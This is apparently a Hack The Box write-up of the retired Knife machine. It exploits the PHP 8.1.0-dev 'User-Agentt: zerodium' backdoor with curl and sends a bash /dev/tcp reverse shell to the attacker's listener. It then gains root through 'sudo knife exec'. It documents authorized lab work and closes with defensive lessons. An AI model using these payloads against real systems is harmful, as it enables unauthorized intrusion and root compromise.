---
title: "Hack The Box — Knife"
summary: "Knife exposes a backdoored PHP 8.1.0-dev runtime through HTTP; a crafted header gives a james shell, and sudo access to Chef knife leads to root."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Easy"
os: "Linux"
solvedAt: 2026-10-02
publishedAt: 2026-10-02
tags:
  - php
  - supply-chain
  - remote-code-execution
  - reverse-shell
  - sudo
  - privilege-escalation
tools:
  - Nmap
  - curl
  - Netcat
  - Chef knife
cves: []
htbUrl: "https://app.hackthebox.com/machines/Knife"
cover: "/images/writeups/hackthebox/machines/knife/knife.png"
coverAlt: "Hack The Box Knife machine logo, a robot holding a knife inside a green circle"
featured: false
draft: false
---

> This write-up documents an authorized Hack The Box lab. The [official Knife page](https://www.hackthebox.com/machines/knife) identifies the machine as **Retired**. Flag values, personal VPN addresses, and unrelated secrets are omitted. Substitute the IP addresses assigned to your own lab instance.

## Executive summary

Knife serves a website through Apache and a PHP 8.1.0-dev build containing a backdoor. The `X-Powered-By` response header reveals the PHP version; a crafted `User-Agentt` request header confirms code execution as `james`. A reverse shell gives access to the user flag. Local enumeration with `sudo -l` then shows that `james` can run Chef's `knife` as root without a password. Because `knife exec -E` evaluates Ruby code, it can start a root shell.

## Target information

| Item | Value |
| --- | --- |
| Target | Knife |
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Linux |
| Publication policy | Retired, confirmed by the [official machine page](https://www.hackthebox.com/machines/knife) |
| Solved | 2 October 2026 |
| Main weaknesses | Backdoored PHP development build; unrestricted `sudo` access to Chef `knife` |

HTB target and VPN addresses change between sessions. Set yours before running the commands:

```bash
export TARGET_IP='<TARGET_IP>'
export LHOST='<YOUR_TUN0_IP>'
```

## Enumeration

I scanned all TCP ports with default scripts and version detection:

```bash
nmap "$TARGET_IP" -T5 -sCV -p-
```

The scan found two open ports:

```text
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http  Apache httpd 2.4.41 (Ubuntu)
```

The HTTP title was `Emergent Medical Idea`. Nmap identified Apache, but its service banner did not show which runtime processed the page. I requested the home page and printed its response headers:

```bash
curl -sD - -o /dev/null "http://$TARGET_IP/"
```

```text
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```

`PHP/8.1.0-dev` was the key lead. A development build exposed on a web server deserves an exact-version search. Searching for `PHP 8.1.0-dev backdoor` leads to the [malicious PHP source commit](https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a). The response header alone is a clue, not proof that this particular installation contains the backdoor; the next request tests it.

### Findings

| Evidence | Why it mattered |
| --- | --- |
| Only SSH and HTTP were open | The website was the practical initial-access surface; no SSH credentials were known. |
| `X-Powered-By: PHP/8.1.0-dev` | It gave an exact, unusual runtime version to investigate. |
| `Emergent Medical Idea` page | It confirmed that the home page was being served, but its visible content was not the weakness used here. |

## Initial access

### Understanding and validating the PHP backdoor

The malicious change in `ext/zlib/zlib.c` reads `HTTP_USER_AGENTT`, the PHP server-variable form of the HTTP header `User-Agentt` (with **two** `t` characters at the end). If its value contains `zerodium`, the code passes the text after the first eight characters to `zend_eval_string()`. Placing `zerodium` at the start makes the remaining text valid PHP code. This is a backdoor in the PHP runtime, not an input-handling bug in the website.

I first sent a low-impact `id` command:

```bash
curl -s \
  -H 'User-Agentt: zerodiumsystem("id");' \
  "http://$TARGET_IP/" | head
```

The response began with:

```text
uid=1000(james) gid=1000(james) groups=1000(james)
<!DOCTYPE html>
```

The prefix `zerodium` is consumed by the trigger, leaving `system("id");` for PHP to evaluate. `system()` runs the OS command and prints its output before the normal HTML. The `uid=1000(james)` result confirms command execution as `james`; it does not imply root access.

### Obtaining a shell and the user flag

I found the Kali VPN address on `tun0`, then started a listener in a separate terminal:

```bash
ip -4 addr show tun0
nc -lvnp 4444
```

In the first terminal, I sent a Bash reverse-shell command through the same header:

```bash
curl --max-time 5 -s \
  -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/${LHOST}/4444 0>&1'\");" \
  "http://$TARGET_IP/"
```

The listener received a connection from the target. The `curl` request may time out after five seconds because the server-side command keeps the shell open; check the listener rather than treating that timeout as a failed exploit. The shell reported `james`. I confirmed the flag's location without publishing its value:

```bash
id
ls -la /home/james
cat /home/james/user.txt
```

The reverse shell printed `cannot set terminal process group` and `no job control in this shell`. These messages reflect the lack of a proper terminal over the basic Netcat connection; they did not prevent command execution.

## Privilege escalation

I checked the `james` account's sudo permissions:

```bash
sudo -l
```

```text
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

This entry permits `james` to run `/usr/bin/knife` as root without a password. Chef's [`knife exec -E` option](https://docs.chef.io/workstation/26/tools/knife/knife_exec/) executes a supplied Ruby string locally. Running that feature under `sudo` therefore executes the Ruby code with root privileges:

```bash
sudo /usr/bin/knife exec -E 'system("/bin/bash")'
id
cat /root/root.txt
```

`id` returned `uid=0(root)`, and the root flag was readable. The trust-boundary failure was the broad `sudoers` permission for a program capable of arbitrary local code execution. `knife` itself did not require a software vulnerability: Ruby's `system()` simply started `/bin/bash` as a child of the root-owned `knife` process.

## What did not work

- Pasting several commands into the basic reverse shell caused input to run together. One attempted read became a path ending in `root.txtwhoami` and failed. Running each command separately allowed the root flag to be read normally.
- The reverse shell had no job control. That terminal limitation was noisy, but `sudo -l`, `knife exec`, and the flag reads still worked.

## Attack path

1. Nmap found SSH and an Apache website on ports 22 and 80.
2. The HTTP response header exposed `PHP/8.1.0-dev`; the PHP backdoor source identified the `User-Agentt` trigger.
3. A request carrying `zerodiumsystem("id");` confirmed code execution as `james`.
4. The same header launched a reverse shell, giving access to `/home/james/user.txt`.
5. `sudo -l` revealed passwordless root execution of `/usr/bin/knife`.
6. `knife exec -E` ran Ruby's `system("/bin/bash")` as root, allowing `/root/root.txt` to be read.

## Lessons learned

- Inspect HTTP response headers after port scanning. Apache's banner alone did not expose the PHP version that led to this foothold.
- Treat a version match as a lead and validate the behavior with a harmless command before building a shell payload. Here, `id` proved both code execution and the initial privilege level.
- Review what an allowed `sudo` program can **do**, not only its name. Granting unrestricted root access to a local code-execution feature is equivalent to granting a root shell.
- For a real system, replace compromised PHP builds, investigate requests containing `User-Agentt`, and restrict `sudoers` to commands that cannot execute arbitrary code.

## References

- [Hack The Box — Knife (official Retired machine page)](https://www.hackthebox.com/machines/knife)
- [PHP source commit showing the `User-Agentt` backdoor](https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a)
- [Chef documentation — `knife exec`](https://docs.chef.io/workstation/26/tools/knife/knife_exec/)
